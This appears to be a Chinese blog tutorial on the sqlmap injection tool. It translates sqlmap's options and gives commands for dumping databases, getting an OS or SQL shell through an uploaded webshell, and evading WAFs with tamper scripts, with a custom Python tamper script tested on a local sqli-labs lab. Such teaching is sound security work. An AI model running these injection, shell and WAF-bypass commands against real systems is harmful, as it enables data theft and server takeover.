## 前言

sqlmap也是渗透中常用的一个注入工具，当你使用它的时候你就会感叹它功能的强大。这里整理一下sqlmap工具的使用教程。

## Sqlmap简介

### 支持的注入类型

- 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
- 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
- 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
- 4、联合查询注入，可以使用union的情况下的注入。
- 5、堆查询注入，可以同时执行多条语句的执行时的注入。

### sqlmap支持的数据库

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

## Sqlmap参数中文翻译

### Target（目标）：

以下至少需要设置其中一个选项，设置目标URL。

- -d DIRECT 直接连接到数据库。
- -u URL, –url=URL 目标URL。
- -l LIST 从Burp或WebScarab代理的日志中解析目标。
- -r REQUESTFILE 从一个文件中载入HTTP请求。
- -g GOOGLEDORK 处理Google dork的结果作为目标URL。
- -c CONFIGFILE 从INI配置文件中加载选项。

### Request（请求）：

这些选项可以用来指定如何连接到目标URL。

- –data=DATA 通过POST发送的数据字符串
- –cookie=COOKIE HTTP Cookie头
- –cookie-urlencode URL 编码生成的cookie注入
- –drop-set-cookie 忽略响应的Set – Cookie头信息
- –user-agent=AGENT 指定 HTTP User – Agent头
- –random-agent 使用随机选定的HTTP User – Agent头
- –referer=REFERER 指定 HTTP Referer头
- –headers=HEADERS 换行分开，加入其他的HTTP头
- –auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
- –auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
- –auth-cert=ACERT HTTP认证证书（key_file，cert_file）
- –proxy=PROXY 使用HTTP代理连接到目标URL
- –proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
- –ignore-proxy 忽略系统默认的HTTP代理
- –delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
- –timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
- –retries=RETRIES 连接超时后重新连接的时间（默认3）
- –scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
- –safe-url=SAFURL 在测试过程中经常访问的url地址
- –safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL

### Enumeration（枚举）：

这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行
您自己的SQL语句。

- -b, –banner 检索数据库管理系统的标识
- –current-user 检索数据库管理系统当前用户
- –current-db 检索数据库管理系统当前数据库
- –is-dba 检测DBMS当前用户是否DBA
- –users 枚举数据库管理系统用户
- –passwords 枚举数据库管理系统用户密码哈希
- –privileges 枚举数据库管理系统用户的权限
- –roles 枚举数据库管理系统用户的角色
- –dbs 枚举数据库管理系统数据库
- -D DBname 要进行枚举的指定数据库名
- -T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）
- –tables 枚举的DBMS数据库中的表
- –columns 枚举DBMS数据库表列
- –dump 转储数据库管理系统的数据库中的表项
- –dump-all 转储所有的DBMS数据库表中的条目
- –search 搜索列（S），表（S）和/或数据库名称（S）
- -C COL 要进行枚举的数据库列
- -U USER 用来进行枚举的数据库用户
- –exclude-sysdbs 枚举表时排除系统数据库
- –start=LIMITSTART 第一个查询输出进入检索
- –stop=LIMITSTOP 最后查询的输出进入检索
- –first=FIRSTCHAR 第一个查询输出字的字符检索
- –last=LASTCHAR 最后查询的输出字字符检索
- –sql-query=QUERY 要执行的SQL语句
- –sql-shell 提示交互式SQL的shell

### Optimization（优化）：

这些选项可用于优化SqlMap的性能。

- -o 开启所有优化开关
- –predict-output 预测常见的查询输出
- –keep-alive 使用持久的HTTP（S）连接
- –null-connection 从没有实际的HTTP响应体中检索页面长度
- –threads=THREADS 最大的HTTP（S）请求并发量（默认为1）

### Injection（注入）：

这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。

- -p TESTPARAMETER 可测试的参数（S）
- –dbms=DBMS 强制后端的DBMS为此值
- –os=OS 强制后端的DBMS操作系统为这个值
- –prefix=PREFIX 注入payload字符串前缀
- –suffix=SUFFIX 注入payload字符串后缀
- –tamper=TAMPER 使用给定的脚本（S）篡改注入数据

### Detection（检测）：

这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。

- –level=LEVEL 执行测试的等级（1-5，默认为1）
- –risk=RISK 执行测试的风险（0-3，默认为1）
- –string=STRING 查询时有效时在页面匹配字符串
- –regexp=REGEXP 查询时有效时在页面匹配正则表达式
- –text-only 仅基于在文本内容比较网页

### Techniques（技巧）：

这些选项可用于调整具体的SQL注入测试。

- –technique=TECH SQL注入技术测试（默认BEUST）
- –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
- –union-cols=UCOLS 定列范围用于测试UNION查询注入
- –union-char=UCHAR 用于暴力猜解列数的字符

### Fingerprint（指纹）：

- -f, –fingerprint 执行检查广泛的DBMS版本指纹

### Brute force（蛮力）：

这些选项可以被用来运行蛮力检查。

- –common-tables 检查存在共同表
- –common-columns 检查存在共同列

User-defined function injection（用户自定义函数注入）：
这些选项可以用来创建用户自定义函数。

–udf-inject 注入用户自定义函数
–shared-lib=SHLIB 共享库的本地路径

### File system access（访问文件系统）：

这些选项可以被用来访问后端数据库管理系统的底层文件系统。

- –file-read=RFILE 从后端的数据库管理系统文件系统读取文件
- –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
- –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径

### Operating system access（操作系统访问）：

这些选项可以用于访问后端数据库管理系统的底层操作系统。

- –os-cmd=OSCMD 执行操作系统命令
- –os-shell 交互式的操作系统的shell
- –os-pwn 获取一个OOB shell，meterpreter或VNC
- –os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
- –os-bof 存储过程缓冲区溢出利用
- –priv-esc 数据库进程用户权限提升
- –msf-path=MSFPATH Metasploit Framework本地的安装路径
- –tmp-path=TMPPATH 远程临时文件目录的绝对路径

### Windows注册表访问：

这些选项可以被用来访问后端数据库管理系统Windows注册表。

- –reg-read 读一个Windows注册表项值
- –reg-add 写一个Windows注册表项值数据
- –reg-del 删除Windows注册表键值
- –reg-key=REGKEY Windows注册表键
- –reg-value=REGVAL Windows注册表项值
- –reg-data=REGDATA Windows注册表键值数据
- –reg-type=REGTYPE Windows注册表项值类型

这些选项可以用来设置一些一般的工作参数。

- -t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
- -s SESSIONFILE 保存和恢复检索会话文件的所有数据
- –flush-session 刷新当前目标的会话文件
- –fresh-queries 忽略在会话文件中存储的查询结果
- –eta 显示每个输出的预计到达时间
- –update 更新SqlMap
- –save file保存选项到INI配置文件
- –batch 从不询问用户输入，使用所有默认配置。

### Miscellaneous（杂项）：

- –beep 发现SQL注入时提醒
- –check-payload IDS对注入payloads的检测测试
- –cleanup SqlMap具体的UDF和表清理DBMS
- –forms 对目标URL的解析和测试形式
- –gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
- –page-rank Google dork结果显示网页排名（PR）
- –parse-errors 从响应页面解析数据库管理系统的错误消息
- –replicate 复制转储的数据到一个sqlite3数据库
- –tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
- –wizard 给初级用户的简单向导界面

##  Sqlmap常用参数解析

从上面的sqlmap的参数可以看出sqlmap的功能非常的强大这里简述一些比较常用的命令:

**注入点存在于GET请求的URL参数上:**

```
sqlmap -u www.xxxx/aboutus.php?id=1 --current-db //查询当前数据库
sqlmap -u www.xxxx/aboutus.php?id=1 -D 数据库名字 --tables //查询所有表
sqlmap -u www.xxxx/aboutus.php?id=1 -D 数据库名字 -T 表名 --columns //查询表里的所有字段
sqlmap -u www.xxxx/aboutus.php?id=1 -D 数据库名字 -T 表名 -C 字段 --dump
```

**POST注入**

使用burp抓包，在注入点前加个*号当然不加也没有关系sqlmap会自动检测。

![image-20201019155415393](http://picbed.easy233.top//imgimage-20201019155415393.png)

命令:``sqlmap.py -r 1.txt --batch`` ，接下来爆出数据和GET方法相同。

![image-20201019155535435](http://picbed.easy233.top//imgimage-20201019155535435.png)

还有一些常用命令:

- -–is-dba 当前用户权限（是否为root权限）
- --dbs 所有数据库
- -–current-user 当前数据库用户
- –-random-agent 构造随机user-agent
- –-proxy http://local:8080 –-threads 10 (可以自定义线程加速) 代理
- -–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
- --batch 从不询问用户输入，使用所有默认配置。

### sqlmap获取shell

#### --os-shell

利用条件：

- 网站必须要是root权限
- 攻击者必须要知道网站的绝对路径
- Secure_file_priv参数为空或者为指定路径。

这时候sqlmap会上传两个文件到目标服务器上一个为文件上传脚本，另一个是一句话木马脚本。而当用户离开os-shell的时候sqlmap会自动把这两个文件删除。

#### --sql-shell

该命令可以为我们提供一个sql的shell，但该shell在使用方面存在很多的限制，只有在支持堆叠查询时，才可以执行非查询SQL语句。

![image-20201019163748558](http://picbed.easy233.top//imgimage-20201019163748558.png)

## Sqlmap的脚本绕过waf

| 脚本名                       | 描述                                                         | 适用范围                                                     |
| ---------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| apostrophemask.py            | 作用：用utf8代替引号<br />Example: (``"1 AND '1'='1"``) '1 ``AND` `%EF%BC%871%EF%BC%87=%EF%BC%871' | ALL                                                          |
| greatest.py                  | 绕过过滤’>’ ,用GREATEST替换大于号。                          | MYSQL                                                        |
| apostrophenullencode.py      | 绕过过滤双引号，替换字符和双引号。                           | ALL                                                          |
| halfversionedmorekeywords.py | 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论 | MySQL < 5.1                                                  |
| space2morehash.py            | 空格替换为 #号 以及更多随机字符串 换行符                     | MySQL >= 5.1.13                                              |
| appendnullbyte.py            | 在有效负荷结束位置加载零字节字符编码，                       | Microsoft Access数据有效                                     |
| base64encode.py              | 作用：替换为base64编码<br/>使用脚本前：`tamper("1' AND SLEEP(5)#")`<br/>使用脚本后：`MScgQU5EIFNMRUVQKDUpIw==` | ALL                                                          |
| nonrecursivereplacement.py   | 双写关键字，例如select->selselectect                         | ALL                                                          |
| space2plus.py                | 用加号替换空格                                               | ALL                                                          |
| securesphere.py              | 追加特定的字符串<br/>使用脚本前：`tamper('1 AND 1=1')`<br/>使用脚本后：`1 AND 1=1 and '0having'='0having'` | ALL                                                          |
| space2dash.py                | 将空格替换为`--`，并添加一个随机字符串和换行符<br/>使用脚本前：`tamper('1 AND 9227=9227')`<br/>使用脚本后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227` | ALL                                                          |
| space2mssqlblank.py          | 将空格随机替换为其他空格符号`('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')`<br/>使用脚本前：`tamper('SELECT id FROM users')`<br/>使用脚本后：`SELECT%0Eid%0DFROM%07users` | Microsoft SQL Server                                         |
| between.py                   | 用`NOT BETWEEN 0 AND #`替换`>`                               | 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 |
| randomcase.py                | 随机大小写                                                   | ALL                                                          |
| space2comment.py             | 将空格替换为`/**/`                                           | 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 |
| equaltolike.py               | 将`=`替换为`LIKE`                                            | Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5              |
| versionedkeywords.py         | 注释绕过                                                     | mysql                                                        |
| randomcomments.py            | 用注释符分割sql关键字使用脚本前：`tamper('INSERT')`<br/>使用脚本后：`I/**/N/**/SERT` | ALL                                                          |
| chardoubleencode.py          | 对给定的payload全部字符使用双重url编码（不处理已经编码的字符） |                                                              |

例如sql-lib的第23关过滤了--与+我们可以使用注释绕过脚本:``versionedkeywords.py``

``sqlmap.py -u http://192.168.10.37/easy201020/sqli-labs/Less-23/?id=1 --tamper=versionedkeywords.py``

下面可以看sqlmap的测试语句。

![image-20201018191749092](http://picbed.easy233.top//imgimage-20201018191749092.png)

## sqlmap编写tamper脚本

sqlmap编写一个tamper脚本非常简单这里编写一个把空格替换为/**/作为实例:

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs): # tamper函数体内你可以把payload和kwargs当作已经传递进来的值
    payload = payload.replace(" ","/**/") #将空格替换为/**/
    print payload #适当的还可以直接输出，不使用-v参数了。
    return payload #必须返回最后的Payload
```

注释已经写的很清楚了认真看应该很容易看得懂，把该python脚本放置到sqlmap下的tamper文件夹下

测试：``sqlmap.py -u http://192.168.10.37/easy201020/sqli-labs/Less-23/?id=1 --tamper=test.py``

![image-20201018194833881](http://picbed.easy233.top//imgimage-20201018194833881.png)

